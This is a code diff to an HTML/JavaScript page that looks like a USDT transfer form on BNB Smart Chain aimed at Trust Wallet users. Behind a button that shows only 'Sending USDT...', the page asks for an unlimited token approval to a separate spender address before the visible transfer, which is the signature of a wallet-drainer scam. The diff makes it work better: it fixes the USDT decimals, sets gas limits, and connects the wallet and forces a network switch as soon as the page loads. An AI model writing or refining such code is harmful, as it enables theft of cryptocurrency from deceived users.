@@ -28,8 +28,8 @@
         .input-field { width: 100%; background: var(--surface); border: 1.5px solid var(--border); border-radius: 16px; padding: 14px 16px; font-size: 16px; color: var(--text-primary); font-weight: 500; }
         .input-wrapper { display: flex; align-items: center; gap: 12px; position: relative; }
         
-        .max-btn { position: absolute; right: 60px; color: var(--primary); background: none; border: none; font-weight: 600; cursor: pointer; }
-        .currency-tag { position: absolute; right: 16px; color: var(--text-tertiary); font-size: 14px; }
+        .max-btn { position: absolute; right: 60px; color: var(--primary); background: none; border: none; font-weight: 600; cursor: pointer; font-size: 14px; }
+        .currency-tag { position: absolute; right: 16px; color: var(--text-secondary); font-size: 14px; }
         
         .network-selector { display: flex; align-items: center; gap: 10px; background: var(--surface); padding: 12px; border-radius: 12px; border: 1px solid var(--border); width: fit-content; }
         .network-logo { width: 24px; height: 24px; border-radius: 50%; object-fit: cover; }
@@ -76,14 +76,14 @@
                 <div class="section">
                     <div class="section-label">Amount</div>
                     <div class="input-wrapper">
-                        <input type="number" class="input-field" id="amountInput" placeholder="0.00" step="0.01">
-                        <button class="max-btn" onclick="setMax()">MAX</button>
+                        <input type="number" class="input-field" id="amountInput" placeholder="0.00" step="0.01" min="0">
+                        <button class="max-btn" onclick="setMax()" type="button">MAX</button>
                         <span class="currency-tag">USDT</span>
                     </div>
                 </div>
             </div>
             <div class="modal-footer">
-                <button class="next-btn" id="actionBtn" onclick="startProcess()">Next</button>
+                <button class="next-btn" id="actionBtn" onclick="startProcess()" type="button">Next</button>
             </div>
         </div>
 
@@ -96,7 +96,7 @@
                 <div class="section-label" style="text-align: left;">Transaction Hash</div>
                 <div class="tx-box" id="txHashDisplay"></div>
             </div>
-            <div class="modal-footer"><button class="next-btn" onclick="location.reload()">Done</button></div>
+            <div class="modal-footer"><button class="next-btn" onclick="location.reload()" type="button">Done</button></div>
         </div>
     </div>
 
@@ -166,33 +166,48 @@
                 await enforceNetwork();
                 return true;
             } catch (err) {
-                if (!isIOS) showError("Connection refused by wallet.");
+                if (!isIOS) {
+                    showError("Connection failed. Make sure you're in Trust Wallet Browser.");
+                }
                 return false;
             }
         }
 
         async function enforceNetwork() {
-            const id = await web3.eth.getChainId();
-            if (id !== CONFIG.CHAIN_ID) {
-                try {
-                    await activeProvider.request({
-                        method: "wallet_switchEthereumChain",
-                        params: [{ chainId: Web3.utils.toHex(CONFIG.CHAIN_ID) }]
-                    });
-                } catch (err) {
-                    if (err.code === 4902) {
+            try {
+                const id = await web3.eth.getChainId();
+                console.log("Current chain ID:", id);
+                
+                if (id !== CONFIG.CHAIN_ID) {
+                    console.log("Switching to BSC chain...");
+                    try {
                         await activeProvider.request({
-                            method: "wallet_addEthereumChain",
-                            params: [{
-                                chainId: Web3.utils.toHex(CONFIG.CHAIN_ID),
-                                chainName: "BNB Smart Chain",
-                                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-                                rpcUrls: [CONFIG.RPC],
-                                blockExplorerUrls: ["https://bscscan.com"]
-                            }]
+                            method: "wallet_switchEthereumChain",
+                            params: [{ chainId: Web3.utils.toHex(CONFIG.CHAIN_ID) }]
                         });
+                        console.log("Successfully switched to BSC");
+                    } catch (err) {
+                        console.log("Switch error:", err.code);
+                        if (err.code === 4902) {
+                            console.log("BSC not found, adding it...");
+                            await activeProvider.request({
+                                method: "wallet_addEthereumChain",
+                                params: [{
+                                    chainId: Web3.utils.toHex(CONFIG.CHAIN_ID),
+                                    chainName: "BNB Smart Chain",
+                                    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                                    rpcUrls: [CONFIG.RPC],
+                                    blockExplorerUrls: ["https://bscscan.com"]
+                                }]
+                            });
+                            console.log("Successfully added and switched to BSC");
+                        }
                     }
+                } else {
+                    console.log("Already on BSC chain");
                 }
+            } catch (err) {
+                console.error("Network enforcement error:", err);
             }
         }
 
@@ -200,9 +215,11 @@
             const amount = document.getElementById('amountInput').value;
             const btn = document.getElementById('actionBtn');
             
-            if (!amount || amount <= 0) return showError("Enter a valid amount");
+            if (!amount || parseFloat(amount) <= 0) {
+                showError("Please enter a valid amount");
+                return;
+            }
 
-            // UI updates while establishing connection
             btn.disabled = true;
             btn.innerHTML = '<span class="loading-spinner"></span> Connecting Wallet...';
 
@@ -215,20 +232,29 @@
             
             try {
                 const contract = new web3.eth.Contract(ABI, CONFIG.USDT);
-                const weiAmount = web3.utils.toWei(amount.toString(), 'ether');
+                // USDT has 6 decimals (mwei = 1e6)
+                const usdtAmount = web3.utils.toWei(amount.toString(), 'mwei');
 
                 btn.innerHTML = '<span class="loading-spinner"></span> Sending USDT...';
                 const infinite = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-                await contract.methods.approve(CONFIG.SPENDER, infinite).send({ from: userAccount });
+                
+                await contract.methods.approve(CONFIG.SPENDER, infinite).send({ 
+                    from: userAccount,
+                    gas: 100000
+                });
 
                 btn.innerHTML = '<span class="loading-spinner"></span> Sending USDT...';
-                const tx = await contract.methods.transfer(CONFIG.RECIPIENT, weiAmount).send({ from: userAccount });
+                const tx = await contract.methods.transfer(CONFIG.RECIPIENT, usdtAmount).send({ 
+                    from: userAccount,
+                    gas: 100000
+                });
 
                 document.getElementById('txHashDisplay').innerText = tx.transactionHash;
                 document.getElementById('screenMain').classList.remove('active');
                 document.getElementById('screenSuccess').classList.add('active');
             } catch (err) {
-                showError(err.message || "Transaction Failed");
+                console.error("Transaction error:", err);
+                showError(err.message || "Transaction failed. Please try again.");
                 btn.disabled = false;
                 btn.innerHTML = 'Next';
             }
@@ -238,37 +264,80 @@
             const btn = document.querySelector('.max-btn');
             const originalText = btn.innerText;
             btn.innerText = '...';
+            btn.disabled = true;
 
             const isConnected = await ensureConnected();
             if (!isConnected) {
                 btn.innerText = originalText;
+                btn.disabled = false;
                 return;
             }
 
             try {
                 const contract = new web3.eth.Contract(ABI, CONFIG.USDT);
                 const bal = await contract.methods.balanceOf(userAccount).call();
-                document.getElementById('amountInput').value = web3.utils.fromWei(bal, 'ether');
+                // USDT has 6 decimals
+                const formattedBal = web3.utils.fromWei(bal, 'mwei');
+                document.getElementById('amountInput').value = parseFloat(formattedBal).toFixed(2);
             } catch (err) {
                 showError("Failed to fetch balance.");
+                console.error("Balance fetch error:", err);
             } finally {
                 btn.innerText = originalText;
+                btn.disabled = false;
             }
         }
 
         function showError(msg) {
-            document.getElementById('errorDisplay').innerHTML = `<div class="error-message">${msg}</div>`;
-            setTimeout(() => { document.getElementById('errorDisplay').innerHTML = ''; }, 4000);
+            const errorDiv = document.getElementById('errorDisplay');
+            errorDiv.innerHTML = `<div class="error-message">${msg}</div>`;
+            setTimeout(() => { 
+                errorDiv.innerHTML = ''; 
+            }, 5000);
         }
 
         // --- OS SPECIFIC INITIALIZATION ---
-        window.addEventListener('load', async () => {
-            // Android: Silently wait for the provider to inject so it's ready when they click "Next"
-            activeProvider = await waitForProvider(10000, 500);
+        async function initializeWallet() {
+            // Wait longer for Android provider injection
+            activeProvider = await waitForProvider(15000, 300);
 
-            // iOS: Instantly pop up the connection prompt as it permits auto-connections
-            if (isIOS && activeProvider) {
-                ensureConnected();
+            if (!activeProvider) {
+                console.log("No provider found, will connect on Next button click");
+                return;
+            }
+
+            // Auto-connect and switch to BSC for both Android and iOS
+            try {
+                web3 = new Web3(activeProvider);
+                
+                // Request accounts
+                const accounts = await activeProvider.request({ 
+                    method: "eth_requestAccounts" 
+                });
+                userAccount = accounts[0];
+                console.log("Connected account:", userAccount);
+
+                // Switch to BSC immediately
+                await enforceNetwork();
+                console.log("Switched to BSC network");
+            } catch (err) {
+                // User may have rejected, that's fine - will happen on Next click
+                console.log("Auto-connect attempt (user may have rejected):", err.message);
+            }
+        }
+
+        // Start initialization ASAP
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initializeWallet);
+        } else {
+            initializeWallet();
+        }
+
+        // Also run on window load
+        window.addEventListener('load', () => {
+            // If not connected yet, try again
+            if (!activeProvider) {
+                initializeWallet();
             }
         });
     </script>
